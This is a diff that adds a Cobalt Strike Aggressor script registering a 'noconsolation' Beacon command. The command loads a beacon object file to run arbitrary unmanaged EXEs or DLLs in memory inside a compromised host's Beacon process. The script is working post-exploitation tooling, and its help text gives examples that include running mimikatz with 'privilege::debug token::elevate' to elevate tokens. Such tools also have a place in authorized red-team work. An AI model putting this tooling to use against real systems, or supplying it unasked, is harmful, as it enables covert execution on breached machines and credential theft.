@@ -1,0 +1,203 @@
+
+alias noconsolation
+{
+    local('$bid $barch $PE $args $path $path_set $pebytes $x $matchfound $local $cmdline $headers $method $use_unicode $timeout $nooutput $alloc_console $close_handles $free_libs');
+
+    $bid = $1;
+    $local = 0;
+    $i = 1;
+    $path = '';
+    $path_set = 0;
+    $pebytes = '';
+    $headers = 0;
+    $method = '';
+    $use_unicode = 0;
+    $timeout = 60;
+    $nooutput = 0;
+    $alloc_console = 0;
+    $close_handles = 0;
+    $free_libs = 0;
+
+    # make sure the beacon is not WoW64
+    $is64 = binfo($bid, "is64");
+    if($barch eq "x86" && $is64 == 1)
+    {
+        berror($1, "WoW64 is not supported");
+        return;
+    }
+
+    if(size(@_) < 2)
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("noconsolation"));
+        return;
+    }
+
+    for ($i = 1; $i < size(@_); $i++)
+    {
+        if (@_[$i] eq "--local" || @_[$i] eq "-l")
+        {
+            $local = 1;
+        }
+        else if (@_[$i] eq "--timeout" || @_[$i] eq "-t")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --timeout value");
+                return;
+            }
+
+            $timeout = @_[$i];
+            if(!-isnumber $timeout)
+            {
+                berror($1, "Invalid timeout: " . $timeout);
+                return;
+            }
+        }
+        else if (@_[$i] eq "-k")
+        {
+            $headers = 1;
+        }
+        else if (@_[$i] eq "--method" || @_[$i] eq "-m")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --method value");
+                return;
+            }
+
+            $method = @_[$i];
+        }
+        else if (@_[$i] eq "-w")
+        {
+            $use_unicode = 1;
+        }
+        else if (@_[$i] eq "--no-output" || @_[$i] eq "-no")
+        {
+            $nooutput = 1;
+        }
+        else if (@_[$i] eq "--alloc-console" || @_[$i] eq "-ac")
+        {
+            $alloc_console = 1;
+        }
+        else if (@_[$i] eq "--close-handles" || @_[$i] eq "-ch")
+        {
+            $close_handles = 1;
+        }
+        else if (@_[$i] eq "--free-libraries" || @_[$i] eq "-fl")
+        {
+            $free_libs = 1;
+        }
+        else if (-exists @_[$i] || @_[$i] ismatch '^\p{Alpha}:\\\\.*')
+        {
+            $path_set = 1;
+            $path = @_[$i];
+            break;
+        }
+        else if ($local == 0 && !-exists @_[$i] && @_[$i] ismatch '^/\p{Alpha}.*')
+        {
+            berror($bid, "Specified executable ". @_[$i] ." does not exist");
+            return;
+        }
+        else if (@_[$i] eq "--help" || @_[$i] eq "-h")
+        {
+            berror($1, beacon_command_detail("noconsolation"));
+            return;
+        }
+        else
+        {
+            berror($1, "invalid argument: " . @_[$i]);
+            return;
+        }
+    }
+
+    if ($path_set == 0)
+    {
+        berror($1, "PE path not provided");
+        return;
+    }
+
+    if (!-exists $path && $local == 0)
+    {
+        berror($bid, "Specified executable ". $path ." does not exist");
+        return;
+    }
+
+    if ($local == 0)
+    {
+        $pename = split("/", $path, 50)[-1];
+
+        $handle = openf($path);
+        $pebytes = readb($handle, -1);
+        closef($handle);
+        if(strlen($pebytes) == 0)
+        {
+            berror($1, "could not read PE");
+            return;
+        }
+        $path = '';
+    }
+    else
+    {
+        $pename = split('\\\\', $path, 50)[-1];
+    }
+
+    # Iterate through args given
+    $cmdline = $pename;
+    for ($y = $i + 1; $y < size(@_); $y++)
+    {
+        # We have instructed users to 'escape' double quotes by using a backslash
+        # identify this and replace with a normal double quote.
+        $arg = strrep(@_[$y], '\\"', '"');
+        $cmdline = $cmdline .  " " . $arg;
+    }
+
+    runpe($bid, $pebytes, $path, $local, $timeout, $headers, $cmdline, $method, $use_unicode, $nooutput, $alloc_console, $close_handles, $free_libs);
+}
+
+sub runpe{
+    $barch = barch($1);
+    # read in the right BOF file
+    $handle = openf(script_resource("dist/NoConsolation. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read BOF");
+        return;
+    }
+
+    # Pack the arguments
+    $args = bof_pack($1, "bziiiZzziiiii", $2, $3, $4, $5, $6, $7, $7, $8, $9, $10, $11, $12, $13);
+
+    # Execute BOF
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "noconsolation",
+    "Run an unmanaged EXE/DLL inside Beacon's memory",
+    "
+Summary: Run an unmanaged EXE/DLL inside Beacon's memory.
+
+Usage: noconsolation [--local] [--timeout 60] [-k] [--method funcname] [-w] [--no-output] [--alloc-console] [--close-handles] [--free-libraries] /path/to/binary.exe arg1 arg2
+    --local, -l                           Optional. The binary should be loaded from the target Windows machine
+    --timeout NUM_SECONDS, -t NUM_SECONDS Optional. The number of seconds you wish to wait for the PE to complete running. Default 60 seconds. Set to 0 to disable
+    -k                                    Optional. Overwrite the PE headers
+    --method EXPORT_NAME, -m EXPORT_NAME  Optional. Method or function name to execute in case of DLL. If not provided, DllMain will be executed
+    -w                                    Optional. Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
+    --no-output, -no                      Optional. Do not try to obtain the output
+    --alloc-console, -ac                  Optional. Allocate a console. This will spawn a new process
+    --close-handles, -ch                  Optional. Close Pipe handles once finished. If PowerShell was already ran, this will break the output for PowerShell in the future
+    --free-libraries, -fl                 Optional. Free all loaded DLLs
+    /path/to/binary.exe                   Required. Full path to the windows EXE/DLL you wish you run inside Beacon
+    ARG1 ARG2                             Optional. Parameters for the PE. Must be provided after the path
+
+    Example: noconsolation --local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \$ExecutionContext.SessionState.LanguageMode
+    Example: noconsolation /tmp/mimikatz.exe privilege::debug token::elevate exit
+    Example: noconsolation --local C:\\windows\\system32\\cmd.exe /c ipconfig
+");
